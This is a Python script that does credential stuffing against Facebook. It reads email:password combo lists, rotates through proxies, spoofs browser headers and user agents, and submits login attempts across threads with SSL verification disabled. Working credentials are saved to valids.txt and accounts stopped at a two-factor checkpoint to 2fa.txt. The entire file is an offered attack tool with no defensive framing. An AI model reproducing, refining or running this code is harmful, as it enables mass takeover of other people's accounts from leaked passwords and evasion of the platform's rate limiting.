import base64
import json
import time
import requests
from itertools import cycle
from concurrent.futures import ThreadPoolExecutor
from user_agent import generate_user_agent

# Suppress SSL warnings
requests.packages.urllib3.disable_warnings()

def read_lines(filepath):
    with open(filepath, "r", encoding="utf-8", errors="ignore") as file:
        return [line.strip() for line in file if line.strip()]

def load_credentials(path):
    return [line.split(":", 1) for line in read_lines(path) if ":" in line]

def load_proxy_list(path):
    return read_lines(path)

def perform_login(email, password, proxy=None):
    timestamp = int(time.time())
    session_payload = {
        "type": 0,
        "creation_time": timestamp,
        "callsite_id": 381229079575946
    }

    enctoken = base64.b64encode(json.dumps(session_payload, separators=(",", ":")).encode()).decode()

    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "datr=rYw9aMMrvaIwTjzB3UvpfCBW; sb=rYw9aFQhwkp-k36jr7BlNegU;",
        "Host": "www.facebook.com",
        "Origin": "https://www.facebook.com",
        "Referer": "https://www.facebook.com/",
        "sec-ch-ua": "\"Google Chrome\";v=\"137\", \"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": generate_user_agent()
    }

    data = {
        "jazoest": "2933",
        "lsd": "AVq53wqah7M",
        "email": email,
        "login_source": "comet_headerless_login",
        "next": "",
        "encpass": f"#PWD_INSTAGRAM:0:{timestamp}:{password}"
    }

    params = {"privacy_mutation_token": enctoken, "next": ""}
    proxy_cfg = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None

    try:
        response = requests.post(
            "https://www.facebook.com/login/",
            params=params,
            headers=headers,
            data=data,
            proxies=proxy_cfg,
            timeout=15,
            verify=False
        )

        html = response.text
        cookies = response.cookies.get_dict()

        if "password that you&#039;ve entered is incorrect" in html or "Invalid username or password" in html:
            print(f"[INVALID] {email}:{password}")
        elif "CheckpointDefaultSettingsDropdown" in html:
            print(f"[2FA] {email}:{password}")
            with open("2fa.txt", "a", encoding="utf-8") as f:
                f.write(f"{email}:{password}\n")
        elif "c_user" in cookies:
            print(f"[VALID] {email}:{password}")
            with open("valids.txt", "a", encoding="utf-8") as f:
                f.write(f"{email}:{password}\n")
        elif "You’re Temporarily Blocked" in html:
            print(f"[BLOCKED] {email}:{password}")
        else:
            print(f"[UNKNOWN] {email}:{password} - Code {response.status_code}")
    except Exception as error:
        print(f"[ERROR] {email}:{password} - {error}")

def start_checker(combo_file="combo.txt", proxy_file="proxies.txt", threads=5):
    credentials = load_credentials(combo_file)
    proxies = cycle(load_proxy_list(proxy_file))

    with ThreadPoolExecutor(max_workers=threads) as executor:
        for email, password in credentials:
            proxy = next(proxies)
            executor.submit(perform_login, email, password, proxy)

if __name__ == "__main__":
    start_checker()
